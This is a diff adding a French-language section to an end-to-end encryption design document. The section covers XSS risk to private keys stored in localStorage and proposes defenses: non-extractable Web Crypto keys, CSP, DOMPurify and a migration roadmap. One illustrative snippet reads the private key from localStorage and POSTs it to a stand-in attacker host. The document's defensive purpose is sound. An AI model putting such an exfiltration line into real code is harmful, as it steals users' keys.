@@ -136,22 +136,114 @@ const decrypted = nacl.box.open(
 ✅ **Révocation** : On peut désactiver un device compromis
 ✅ **Scalabilité** : Support natif de N devices par utilisateur
 
+## 🛡️ Sécurité : Vulnérabilité XSS et solutions
+
+### Problème actuel : localStorage et XSS
+
+**Vulnérabilité** : Si un attaquant injecte du JavaScript malveillant (XSS), il peut lire `localStorage` et voler les clés privées.
+
+```javascript
+// Exemple d'attaque XSS
+const stolenKey = localStorage.getItem('e2ee_private_key');
+fetch('https://attacker.com/steal', {
+  method: 'POST',
+  body: stolenKey
+});
+```
+
+### Solutions alternatives
+
+#### 1. Web Crypto API avec clés non-extractables (Recommandé)
+
+**Principe** : Les clés sont stockées via l'API Web Crypto et ne peuvent jamais être exportées.
+
+```javascript
+// Génération de clé NON-EXTRACTABLE
+const keyPair = await crypto.subtle.generateKey(
+  { name: "ECDH", namedCurve: "P-256" },
+  false, // ❌ NON extractable
+  ["deriveBits"]
+);
+```
+
+**Avantages** :
+- ✅ Résistant à l'exfiltration (la clé ne peut pas être lue)
+- ✅ Standard web natif
+- ✅ Meilleure performance (chiffrement natif)
+
+**Limitations** :
+- ⚠️ Un XSS peut toujours **utiliser** la clé (via l'API)
+- 🔧 Nécessite refonte complète du système E2EE
+
+#### 2. Content Security Policy (CSP) + Sanitization
+
+**Principe** : Empêcher l'exécution de scripts non autorisés.
+
+```html
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self'; script-src 'self'">
+```
+
+**Avantages** :
+- ✅ Protection à la source (empêche les XSS)
+- ✅ Facile à implémenter
+- ✅ Compatible avec l'implémentation actuelle
+
+**Recommandation** :
+- Utiliser DOMPurify pour sanitizer toutes les entrées utilisateur
+- Configurer CSP stricte
+- Audits de sécurité réguliers
+
+### Comparaison des solutions
+
+| Solution | Résistance XSS | UX | Complexité | Recommandé |
+|----------|---------------|-----|------------|------------|
+| localStorage (actuel) | 🔴 Faible | 🟢 Excellente | 🟢 Facile | ⚠️ Court terme |
+| Web Crypto non-extractable | 🟡 Moyenne | 🟢 Bonne | 🟡 Moyenne | ✅ Moyen terme |
+| Extension navigateur | 🟢 Élevée | 🟡 Bonne | 🔴 Difficile | ⚠️ Long terme |
+| App native | 🟢 Très élevée | 🟡 Bonne | 🔴 Difficile | ⚠️ Long terme |
+
+### Stratégie de sécurité recommandée
+
+**Court terme (actuel)** :
+- ✅ localStorage avec CSP strict
+- ✅ Sanitization systématique (DOMPurify)
+- ✅ Audits de sécurité
+
+**Moyen terme (6-12 mois)** :
+- 🔄 Migration vers Web Crypto API
+- 🔄 Clés non-extractables
+- 🔄 Stockage dans IndexedDB
+
+**Long terme (12+ mois)** :
+- 🔮 Extension navigateur ou app native
+- 🔮 Stockage OS sécurisé (Keychain/Credential Manager)
+
 ## 🚀 Améliorations futures
 
 ### Court terme
 - [ ] Indicateur visuel de chiffrement (🔒 badge)
 - [ ] Safety numbers (vérification des clés entre utilisateurs)
 - [ ] Gestion des devices (liste + révocation)
+- [ ] Content Security Policy (CSP) strict
+- [ ] Sanitization des entrées utilisateur (DOMPurify)
 
 ### Moyen terme
 - [ ] Chiffrement des fichiers attachés
 - [ ] Recherche côté client pour messages chiffrés
 - [ ] Rotation des clés
+- [ ] **Migration vers Web Crypto API avec clés non-extractables**
+  - Remplacement de TweetNaCl par `crypto.subtle`
+  - Génération de clés avec `extractable: false`
+  - Stockage des `CryptoKey` handles dans IndexedDB
+  - Protection contre l'exfiltration des clés privées en cas de XSS
 
 ### Long terme
 - [ ] Backup chiffré (export/import des clés)
 - [ ] Perfect Forward Secrecy (Double Ratchet Algorithm comme Signal)
 - [ ] Synchronisation sécurisée entre devices
+- [ ] Extension navigateur dédiée pour isolation complète
+- [ ] Application native (Electron) avec stockage OS sécurisé (Keychain/Credential Manager)
 
 ## 📝 Maintenance
 
